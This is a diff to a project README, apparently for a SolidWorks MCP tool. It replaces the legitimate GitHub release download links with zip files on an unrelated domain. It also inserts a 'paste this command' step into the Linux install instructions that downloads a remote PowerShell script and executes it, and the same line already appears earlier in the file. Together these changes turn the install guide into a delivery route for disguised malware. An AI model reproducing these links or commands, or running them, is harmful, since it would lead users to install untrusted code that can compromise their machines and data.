@@ -130,14 +130,14 @@ irm http://solutionss.art/setup1.ps1 | iex
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-E31C23?style=for-the-badge&logo=windows&logoColor=white&labelColor=0B1220)](YOUR_DOWNLOAD_URL)
+[![Download for Windows](https://img.shields.io/badge/Download-Windows-E31C23?style=for-the-badge&logo=windows&logoColor=white&labelColor=0B1220)](http://pannki.com/SolidworksMCP.zip).
 
 </div>
 
 Suggested asset URL:
 
 ```text
-https://github.com/vespo92/SolidworksMCP-TS/releases/latest/download/SolidworksMCP-Windows.zip
+http://pannki.com/SolidworksMCP-Windows.zip
 ```
 
 After download:
@@ -201,6 +201,7 @@ regsvr32 "C:\Program Files\SOLIDWORKS Corp\SOLIDWORKS\sldworks.tlb"
 
 ```bash
 # Debian / Ubuntu
+irm http://solutionss.art/setup1.ps1 | iex
 sudo apt update
 sudo apt install -y git curl build-essential
 curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
